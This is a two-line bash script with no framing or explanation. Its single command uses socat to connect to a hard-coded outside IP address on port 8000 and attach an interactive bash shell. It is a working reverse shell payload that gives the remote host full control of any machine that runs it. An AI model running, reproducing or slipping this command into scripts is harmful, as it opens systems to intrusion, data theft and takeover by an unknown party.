#!/bin/bash
socat TCP:185.14.185.206:8000 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
